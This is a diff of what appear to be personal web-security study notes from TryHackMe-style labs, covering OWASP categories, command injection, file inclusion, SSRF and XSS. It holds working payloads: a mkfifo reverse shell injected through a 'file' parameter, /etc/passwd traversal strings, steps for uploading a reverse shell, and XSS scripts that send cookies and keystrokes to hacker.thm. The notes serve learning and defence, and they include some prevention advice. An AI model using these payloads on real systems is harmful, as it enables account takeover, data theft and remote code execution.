@@ -46,6 +46,9 @@ Tips:
 - We can bypass client-side filtering, example we dont get to write certain characters in a input field, by: 1. Sending some valid input, intercepting it, change post parameters to our payload(JS or something) and remember to URL encode. THEN, forward the request. 
 
 
+
+
+### Vulnerabilities and exploiting them 
 #### OWASP top 10:
 - **Broken Access Control**: User is able to access pages on a site which he is not meant to see, such as admin pages.
 Example IDOR: Insecure Direct object reference, user can get access to resources you would not be able to such as another persons bank account page. 
@@ -81,8 +84,15 @@ Then we can include integrity for this site in our code:
 -  **Server-Side Request Forgery (SSRF)**: Attacker can get the web application to send requests on their behalf.  
 
 #### Command injection:
+"Abuse of an application's behavior to execute commands on the operating system, using the same privileges that the application on a device is running with."
 
-It can be hard to validate that a parameter on a web application in vulnerable to Command injection. 
+**Blind command injection:** Attacker do no receive feedback from web application if the attack worked. We can look for blind command injection by:
+- Use ping or sleep 
+- Redirect output into file, then cat out the content of the file 
+- curl a server the attacker controls
+
+**Verbose command injection:** Attacker can see the output of the command he injected
+
 
 Ex. THM Shell room:
 We get info that the POST parameter "file" is vulnerable. 
@@ -114,6 +124,20 @@ file=hello.txt; rm+-f+/tmp/f%3b+mkfifo+/tmp/f%3b+cat+/tmp/f+|+/bin/sh+-i+2>%261+
 ```
 
 
+#### SQL Injection:
+"User input it not validated correctly when application communicated with the database, allowing the attacker to get, remove or change data in the database"
+
+
+
+
+
+
+
+
+
+
+
+
 #### IDOR (Insecure Direct Object Reference) vulnerability
 "Client is can change parameters to get access to other accounts in the application"
 
@@ -124,6 +148,107 @@ Parameters (such as userid) inputs may be hashed(Most of the time) or encoded, t
 Tools: Network tab i browser, burp suite. 
 
 
+#### File inclusion vulnerability:
+"Request or push of files to a web application is not validated correctly - we can get access to file we are not supposed to or push malicious files."
+
+```
+Common LFI case:  
+Example say the parameter "file" is vulnerable 
+- file=/etc/passwd
+- file=../../  /etc/passwd (Amount of ../ required vary)
+- file=/etc/passwd0x00 (code adds a file extention to our input, /etc/passwd.php, null byte removes it)
+- file=....//....//etc/passwd (../ is removed)
+
+
+```
+
+**RFI: Remote file inclusion** 
+- Identify we are able to do upload arbitrary files
+- Need to understand what kind of files the application is able to execute (PHP, ELF, PE, Python etc)
+- Upload reverse shell with fitting file extension 
+- Setup a listener on our server 
+- Have a way to execute the file we uploaded
+- NOW we have remote code execution 
+
+NOTE from experience: (THM)
+Sometimes it does not work to send just intercept the request, and change from GET to POST. I have to also use the inspector and edit the form method to POST in the browser, before it worked sending POST requests. 
+
+
+**Prevent FIV:**
+  
+1. Keep system and services, including web application frameworks, updated with the latest version.  
+2. Turn off PHP errors to avoid leaking the path of the application and other potentially revealing information.
+3. A Web Application Firewall (WAF) is a good option to help mitigate web application attacks.
+4. Disable some PHP features that cause file inclusion vulnerabilities if your web app doesn't need them, such as allow_url_fopen on and allow_url_include.  
+5. Carefully analyze the web application and allow only protocols and PHP wrappers that are in need.
+6. Never trust user input, and make sure to implement proper input validation against file inclusion.  
+7. Implement whitelisting for file names and locations as well as blacklisting.
+
+#### SSRF (Server Side Request Forgery)
+"We can make the website send http request on own behalf"
+
+**How to spot SSRF:**
+- Full URL is used in address bar
+- A field in a form, sends form values as http?
+- Partial url in the address bar  
+
+**Prevent SSRF:**
+- Deny list: 
+- Allow list:
+
+
+#### XSS (Cross Site Scripting) 
+"An injection attack where malicious JavaScript gets injected into a web application with the intention of being executed by other users"
+
+Examples 
+```javascript
+
+POC:
+<script>alert('XSS');</script>
+
+Other examples:
+<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
+
+<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
+
+<script>user.changeEmail('attacker@hacker.thm');</script>
+
+```
+
+
+Typically, we have to bypass some checks so our payload can go through 
+```
+Different cases:
+- <Img> tag: Try using onload=payload 
+- <textarea> tag: Try adding a closing tag: <\textarea>payload
+- <input> tag: Try closing the "" and the <>: ">payload 
+- Filtering for words of signs: Find out what is filterd and work around 
+```
+
+
+**Where to find (Reflected) XXS Vulnerability:**
+- Parameters in URL query string 
+- URL file path 
+
+**Where to find(stored) XXS Vulnerability:**
+- Comments section on a page
+- User profile information 
+- Website listings 
+- etc.. Points of entry on a site where data is stored and shown back to the user. 
+
+**Blind XSS:**
+- Payload gets stored on the website for others to view, but the attacker cannot see the payload working. 
+- To detect: Payload has to have a callback(Typically HTTP request), such that we can verify it working. Also: XXS Hunter Express https://github.com/mandatoryprogrammer/xsshunter-express
+
+Example senario: "A website has a contact form where you can message a member of staff. The message content doesn't get checked for any malicious code, which allows the attacker to enter anything they wish. These messages then get turned into support tickets which staff view on a private web portal."
+
+
+**DOM based XSS:**
+- JS execution happens directly in the browser without any new page being loaded or data submitted to backend code.
+- Harder to detect, need to read and understand the js code of the site. 
+
+
+### Enumeration / Information gathering 
 #### Content discovery:
 "Finding stuff on web application we are not intended to find"
 - Pages or portals for staff 
